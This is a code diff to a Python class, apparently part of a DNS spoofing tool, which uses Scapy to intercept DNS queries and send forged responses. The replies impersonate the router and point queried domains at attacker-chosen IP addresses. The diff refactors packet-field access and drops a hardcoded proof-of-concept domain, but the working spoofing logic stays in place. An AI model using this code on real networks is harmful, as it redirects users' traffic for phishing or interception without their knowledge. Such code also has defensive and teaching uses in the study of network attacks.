@@ -36,16 +36,16 @@ class DNSfw(Process):
             pkt[IP].src != self.myip
         ):
 
-            spoofed = self.conf.getIPFromDomain(pkt.getlayer(DNS).qd.qname)
+            spoofed = self.conf.getIPFromDomain(pkt[DNS].qd.qname)
             self.counter += 1
             if spoofed:
                 spfResp = IP(dst=pkt[IP].src, src = self.router)\
                     /UDP(dport=pkt[UDP].sport, sport=53)\
-                    /DNS(id=pkt[DNS].id, aa = 1, qr=1, an=DNSRR(rrname=pkt[DNSQR].qname,ttl=10, rdata=spoofed)\
-                    /DNSRR(rrname='poc.argos.sh',rdata=spoofed))
+                    /DNS(id=pkt[DNS].id,  qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname,ttl=10, rdata=spoofed)\
+                    /DNSRR(rrname=pkt[DNS].qd.qname,rdata=spoofed))
                 send(spfResp, verbose=0)
                 if (spfResp.getlayer(DNS).an.rdata):
-                    return '#{}: {} ==> {} {}@{}'.format(self.counter, spfResp[IP].src, spfResp[IP].dst, spfResp.getlayer(DNS).an.rrname, spfResp.getlayer(DNS).an.rdata)
+                    return '#{}: {} ==> {} {}@{}'.format(self.counter, spfResp[IP].src, spfResp[IP].dst, spfResp[DNS].an.rrname, spfResp[DNS].an.rdata)
                 else :
                     return 'dns forwarder error'
             else:
